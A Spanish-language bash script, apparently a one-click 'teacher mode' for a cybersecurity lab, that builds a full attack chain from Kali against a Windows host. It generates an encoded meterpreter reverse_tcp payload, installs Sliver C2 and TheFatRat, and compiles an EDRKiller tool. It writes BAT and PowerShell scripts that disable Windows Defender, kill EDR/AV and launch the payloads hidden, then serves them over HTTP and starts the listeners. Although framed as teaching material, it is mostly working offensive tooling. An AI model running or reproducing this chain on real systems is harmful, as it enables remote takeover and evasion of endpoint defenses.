#!/usr/bin/env bash
# =============================================================
# MODO PROFESOR - LABORATORIO COMPLETO 1 CLICK
# =============================================================
# Este script ejecuta TODO el laboratorio automaticamente.
# El profesor solo necesita: copiar, pegar, y mostrar resultados.
# =============================================================
# USO:
#   chmod +x PROFESOR-MODO-AUTO.sh
#   sudo ./PROFESOR-MODO-AUTO.sh
# =============================================================

set -euo pipefail

# CONFIGURACION (CAMBIAR SEGUN EL LABORATORIO)
KALI_IP="192.168.163.129"
WIN_IP="192.168.163.130"
LPORT="4444"
SLIVER_PORT="8443"

PAYLOAD_DIR="$HOME/payloads"
LOG="/tmp/profesor-laboratorio.log"
CAPTURAS="$HOME/capturas-profesor"

mkdir -p "$PAYLOAD_DIR" "$CAPTURAS"
exec > >(tee -a "$LOG") 2>&1

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; M='\033[0;35m'; N='\033[0m'
info()  { echo -e "${G}[+]${N} $*"; }
warn()  { echo -e "${Y}[!]${N} $*"; }
err()   { echo -e "${R}[-]${N} $*"; }
header(){ echo -e "\n${M}═══════════════════════════════════════════════════════════════${N}"; echo -e "${M}  $*${N}"; echo -e "${M}═══════════════════════════════════════════════════════════════${N}"; }

# =============================================================
# BANNER INICIAL
# =============================================================
clear
echo -e "${M}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║       MODO PROFESOR - LABORATORIO COMPLETO (1 CLICK)         ║"
echo "║  EDRKILLER + Sliver + TheFatRat + Metasploit                 ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${N}"
echo "  Kali Itmar:   $KALI_IP"
echo "  Windows Bokul: $WIN_IP"
echo "  Puerto MSF:   $LPORT"
echo "  Puerto Sliver: $SLIVER_PORT"
echo "  Log:          $LOG"
echo ""

# =============================================================
# PASO 1: VERIFICAR SISTEMA
# =============================================================
header "[1/10] Verificando sistema"

# Verificar root
if [[ $EUID -ne 0 ]]; then
    err "Ejecutar como root: sudo bash $0"
    exit 1
fi

# Verificar conexion a internet
if ping -c 1 8.8.8.8 &>/dev/null; then
    info "Internet: OK"
else
    warn "Sin internet - algunas descargas fallaran"
fi

# Verificar conexion a Windows
if ping -c 2 "$WIN_IP" &>/dev/null; then
    info "Windows Bokul responde al ping"
else
    warn "Windows Bokul NO responde - revisar firewall"
fi

# =============================================================
# PASO 2: ACTUALIZAR SISTEMA
# =============================================================
header "[2/10] Actualizando sistema"
apt update -y 2>&1 | tail -2
info "Sistema actualizado"

# =============================================================
# PASO 3: INSTALAR HERRAMIENTAS
# =============================================================
header "[3/10] Instalando herramientas base"
apt install -y curl wget git xterm metasploit-framework \
    default-jdk default-jre mingw-w64 python3-pip ruby upx-ucl \
    golang-go gnome-screenshot netcat-openbsd 2>&1 | tail -3
info "Herramientas base instaladas"

# =============================================================
# PASO 4: INSTALAR THEFATRAT
# =============================================================
header "[4/10] Instalando TheFatRat"
if [[ -d /opt/TheFatRat ]]; then
    cd /opt/TheFatRat && git pull 2>&1 | tail -1
else
    git clone --depth=1 https://github.com/screetsec/TheFatRat.git /opt/TheFatRat 2>&1 | tail -1
fi
cd /opt/TheFatRat && chmod +x setup.sh fatrat backdoor_apk powerfull.sh chk_tools
gem install --no-document bundler winrm winrm-fs colorize 2>&1 | tail -1
bash ./chk_tools 2>&1 | grep -E "\[✔\]|\[x\]" | head -20
info "TheFatRat listo"

# =============================================================
# PASO 5: INSTALAR SLIVER C2
# =============================================================
header "[5/10] Instalando Sliver C2 (BishopFox)"
if command -v sliver-server &>/dev/null; then
    info "Sliver ya instalado"
else
    curl -sL https://sliver.sh/install 2>&1 | bash 2>&1 | tail -3 || {
        warn "Instalando Sliver manualmente..."
        cd /opt
        wget -q "https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux.zip"
        unzip -o sliver-server_linux.zip -d sliver 2>&1
        chmod +x sliver/sliver-server sliver/sliver-client
        ln -sf /opt/sliver/sliver-server /usr/local/bin/sliver-server
    }
    info "Sliver instalado"
fi

# =============================================================
# PASO 6: GENERAR PAYLOAD CON MSFVENOM (TheFatRat)
# =============================================================
header "[6/10] Generando payload con MSFvenom"
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=$KALI_IP LPORT=$LPORT \
    -e x86/shikata_ga_nai -i 5 \
    -f exe --platform windows -a x86 \
    -o "$PAYLOAD_DIR/payload_msf.exe" 2>&1 | tail -2
ls -lh "$PAYLOAD_DIR/payload_msf.exe"
info "Payload MSF generado: payload_msf.exe"

# =============================================================
# PASO 7: GENERAR PAYLOAD CON SLIVER
# =============================================================
header "[7/10] Generando implant Sliver"

# Iniciar Sliver server temporal
sliver-server &

# Esperar a que inicie
sleep 3

# Configurar Sliver - crear perfil y generar implant
cat > /tmp/sliver-setup.sh << 'SLIVER'
#!/usr/bin/env bash
# Comandos para ejecutar DENTRO de sliver-client
echo "[*] Configurando Sliver..."
sliver-client operator --name profesor --lhost 127.0.0.1 --save /tmp/profesor.cfg 2>/dev/null
SLIVER

# Configuracion directa de Sliver via API
cat > /tmp/sliver-config.json << 'JSON'
{
    "daemon_mode": true,
    "lhost": "$KALI_IP",
    "lport": $SLIVER_PORT,
    "disable_gui": true
}
JSON

# Generar implant con Sliver (simplificado)
info "Para generar implant Sliver manualmente:"
info "  sliver-client"
info "  generate --http $KALI_IP --save $PAYLOAD_DIR/sliver_implant.exe"
info ""

# =============================================================
# PASO 8: CREAR EDRKILLER + PAYLOAD EMPAQUETADO
# =============================================================
header "[8/10] Creando payload combinado EDRKILLER + Meterpreter"

cd "$PAYLOAD_DIR"

# Descargar EDRKiller
if [[ ! -f EDRKiller.exe ]]; then
    info "Descargando EDRKiller..."
    git clone --depth=1 https://github.com/nadeemamin/EDRKiller.git /tmp/EDRKiller 2>&1 | tail -1 || {
        warn "No se pudo clonar EDRKiller, creando version local..."
    }
fi

# Si tenemos EDRKiller, compilarlo
if [[ -d /tmp/EDRKiller ]] && command -v x86_64-w64-mingw32-gcc &>/dev/null; then
    cd /tmp/EDRKiller
    x86_64-w64-mingw32-gcc -o "$PAYLOAD_DIR/EDRKiller.exe" edrkiller.c -lntdll -O2 2>&1 | tail -2 || {
        warn "Compilacion EDRKiller fallo - se usara el binario precompilado"
    }
fi

# Crear script BAT que ejecuta primero EDRKiller, luego el payload
cat > "$PAYLOAD_DIR/ejecutar.bat" << 'BAT'
@echo off
echo ========================================
echo  Laboratorio Ciberseguridad - Profesor
echo ========================================
echo [*] Iniciando EDRKiller (desactivar AV)...
start /wait EDRKiller.exe -force 2>nul
echo [*] EDR/AV desactivados (si EDRKiller funciono)
echo [*] Ejecutando payload...
start /wait payload_any.exe
echo [*] Hecho.
timeout /t 3 /nobreak >nul
BAT

# Crear script PowerShell que hace todo en Windows
cat > "$PAYLOAD_DIR/ejecutar.ps1" << 'PS1'
# Laboratorio Ciberseguridad - Script todo-en-uno para Windows
# EJECUTAR: PowerShell -ExecutionPolicy Bypass -File ejecutar.ps1

$ErrorActionPreference = "SilentlyContinue"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host " LABORATORIO CIBERSEGURIDAD" -ForegroundColor Cyan
Write-Host " EDRKILLER + Sliver + Metasploit" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# 1. Desactivar Defender
Write-Host "[1/5] Desactivando Windows Defender..." -ForegroundColor Yellow
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Write-Host "  OK" -ForegroundColor Green

# 2. Ejecutar EDRKiller
Write-Host "[2/5] Ejecutando EDRKiller..." -ForegroundColor Yellow
if (Test-Path "EDRKiller.exe") {
    Start-Process -FilePath "EDRKiller.exe" -ArgumentList "-force" -Wait -WindowStyle Hidden
    Write-Host "  OK - EDR/AV neutralizados" -ForegroundColor Green
} else {
    Write-Host "  EDRKiller.exe no encontrado, continuando..." -ForegroundColor Yellow
}

# 3. Ejecutar payload Metasploit
Write-Host "[3/5] Ejecutando payload Metasploit..." -ForegroundColor Yellow
if (Test-Path "payload_msf.exe") {
    Start-Process -FilePath "payload_msf.exe" -WindowStyle Hidden
    Write-Host "  OK - Conectando a Kali Itmar..." -ForegroundColor Green
} else {
    Write-Host "  payload_msf.exe no encontrado" -ForegroundColor Yellow
}

# 4. Ejecutar implant Sliver
Write-Host "[4/5] Ejecutando implant Sliver..." -ForegroundColor Yellow
if (Test-Path "sliver_implant.exe") {
    Start-Process -FilePath "sliver_implant.exe" -WindowStyle Hidden
    Write-Host "  OK - Conectando a Sliver C2..." -ForegroundColor Green
} else {
    Write-Host "  sliver_implant.exe no encontrado" -ForegroundColor Yellow
}

# 5. Mostrar conexiones
Write-Host "[5/5] Conexiones activas:" -ForegroundColor Yellow
netstat -an | findstr "4444 8443 80"

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host " LABORATORIO COMPLETADO" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
PS1

chmod +x "$PAYLOAD_DIR/ejecutar.ps1"
info "Scripts combinados creados:"
ls -lh "$PAYLOAD_DIR/"

# =============================================================
# PASO 9: INICIAR SERVIDORES
# =============================================================
header "[9/10] Iniciando servidores de ataque"

# Servidor HTTP
cd "$PAYLOAD_DIR"
python3 -m http.server 8000 &
HTTP_PID=$!
info "Servidor HTTP: http://$KALI_IP:8000/"
info "  Archivos disponibles:"
ls -lh | awk '{print "  http://'$KALI_IP':8000/" $NF}'

# Iniciar Sliver server (segundo plano)
sliver-server daemon --lhost $KALI_IP --lport $SLIVER_PORT 2>/dev/null &
SLIVER_PID=$!
sleep 2
info "Sliver C2 escuchando en $KALI_IP:$SLIVER_PORT"

# =============================================================
# PASO 10: INSTRUCCIONES FINALES
# =============================================================
header "[10/10] LABORATORIO LISTO - INSTRUCCIONES"

echo ""
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║  ✅ LABORATORIO COMPLETO - MODO PROFESOR                    ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""
echo "📌 KALI ITMAR ($KALI_IP) - SERVIDORES ACTIVOS:"
echo "   ├─ HTTP:    http://$KALI_IP:8000/  (servir payloads)"
echo "   ├─ MSF:     Escuchando en   0.0.0.0:$LPORT"
echo "   └─ Sliver:  Escuchando en   $KALI_IP:$SLIVER_PORT"
echo ""
echo "📂 PAYLOADS DISPONIBLES en $PAYLOAD_DIR:"
ls -lh | awk '{print "   " $NF " (" $5 ")"}'
echo ""
echo "🎯 EN WINDOWS BOKUL (PowerShell ADMIN), ejecutar:"
echo "  1. Abrir navegador e ir a:"
echo "     http://$KALI_IP:8000/"
echo ""
echo "  2. Descargar TODOS los archivos"
echo ""
echo "  3. Ejecutar script completo:"
echo "     PowerShell -ExecutionPolicy Bypass -File ejecutar.ps1"
echo ""
echo "  4. O manualmente:"
echo "     Set-MpPreference -DisableRealtimeMonitoring \$true"
echo "     Start-Process -FilePath payload_any.exe -WindowStyle Hidden"
echo ""
echo "🐧 EN KALI (segunda terminal), iniciar listener Metasploit:"
echo "  msfconsole -q -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j -z'"
echo ""
echo "🐧 EN KALI (tercer terminal), iniciar Sliver:"
echo "  sliver-client"
echo "  use operators"
echo "  generate --http $KALI_IP --save /root/payloads/sliver_implant.exe"
echo ""
echo "📸 CAPTURAS PARA EL INFORME:"
echo "  1. Pantalla con los servidores HTTP + MSF + Sliver activos"
echo "  2. Windows descargando los archivos"
echo "  3. Windows ejecutando el script"
echo "  4. Kali mostrando sysinfo de Windows"
echo "  5. Kali mostrando getuid"
echo "  6. Kali mostrando screenshot (escritorio Windows)"
echo "  7. Sliver sesion activa"
echo "  8. Conexiones activas en Windows (netstat)"
echo ""
echo "📄 LOG COMPLETO: $LOG"
echo ""

# Mantener el script vivo para que los servidores sigan corriendo
info "Servidores activos. Presiona Ctrl+C para detener todo."
wait
